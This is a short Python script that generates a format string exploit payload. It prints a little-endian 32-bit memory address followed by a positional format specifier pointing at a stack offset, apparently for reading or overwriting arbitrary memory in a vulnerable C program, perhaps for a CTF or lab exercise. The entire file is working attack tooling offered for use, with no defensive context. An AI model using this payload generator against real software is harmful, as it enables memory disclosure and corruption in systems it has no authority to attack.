#!/usr/bin/env python3

import sys

def help():
    print("Usage: {} {{memory address}} {{format character}} {{offset}}".format(sys.argv[0]))
    print("Address format: 0xXXXXXXXX")
    print("Format character: %s/%c/%x/%d/...")
    print("Offset - number of octets from $esp to start of buffer")
    exit(1)

def get_address(address):
    return address.to_bytes(4, 'little')

if len(sys.argv) < 4:
    help()

address = int(sys.argv[1], 16)
format_char = sys.argv[2]
offset = int(sys.argv[3])

sys.stdout.buffer.write(get_address(address))

output = '%' + str(offset + 1) + '$' + format_char[1:]

print(output, end='')
